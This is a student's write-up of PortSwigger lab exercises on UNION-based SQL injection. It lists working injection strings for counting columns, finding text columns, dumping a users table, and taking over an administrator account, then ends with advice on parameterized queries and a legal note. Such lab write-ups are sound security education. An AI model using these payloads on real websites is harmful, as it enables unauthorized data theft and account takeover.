# SQL Injection - UNION Attacks (PortSwigger Labs 2-4)

## Labs Completed
1. Determining the number of columns returned by the query
2. Finding a column containing text
3. Retrieving data from other tables (admin account takeover)

## Step 1: Determine Number of Columns
Used ORDER BY to find how many columns the query returns:

?category=Food' ORDER BY 1--   -> no error
?category=Food' ORDER BY 2--   -> no error
?category=Food' ORDER BY 3--   -> Internal Server Error

Result: query returns 2 columns

## Step 2: Confirm with UNION SELECT NULL
?category=Food' UNION SELECT NULL,NULL--

No error confirmed column count. NULL is used because it is compatible with
any data type, avoiding type-mismatch errors while testing.

## Step 3: Find Which Column Accepts Text
?category=Food' UNION SELECT 'a','a'--

No error - both columns accept text (string) values.

## Step 4: Retrieve Data From the users Table
?category=Food' UNION SELECT username,password FROM users--

Result: retrieved full list of credentials from the users table:
- administrator : [password hash-like string]
- wiener        : [password hash-like string]
- carlos        : [password hash-like string]

## Step 5: Account Takeover
Logged in as administrator using the retrieved credentials via My Account page.
Lab solved - full admin account access gained purely through SQL injection,
no password guessing or brute force required.

## Key Takeaway
UNION-based SQL injection lets an attacker pull data from ANY table in the
database, not just the one the application intended to query - turning a
simple search/filter feature into a full database dump and account takeover
vector. This is why user input must never be concatenated directly into SQL
queries; parameterized queries/prepared statements prevent this entirely.

## Legal Note
Practiced only on PortSwigger Web Security Academy - an authorized, legal
practice platform built specifically for this purpose. SQL injection against
any website without explicit written permission is illegal (IT Act 2000,
India).
